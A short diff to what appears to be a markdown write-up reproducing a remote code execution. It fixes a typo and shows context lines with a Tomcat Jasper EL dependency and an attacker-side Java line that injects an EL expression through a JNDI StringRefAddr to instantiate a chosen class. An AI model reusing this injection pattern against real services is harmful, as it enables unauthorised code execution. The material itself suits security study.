@@ -64,7 +64,7 @@ For the target I added dependencies
     implementation("org.apache.tomcat:tomcat-jasper-el:8.5.20")
 ```
 
-For the RCE I create `ClassThatPrintsExceptionInConstructor` and modified attacker part for it: 
+For the RCE I created `ClassThatPrintsExceptionInConstructor` and modified attacker part for it: 
 
 ```java
 	ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"ClassThatPrintsExceptionInConstructor\").newInstance()"));
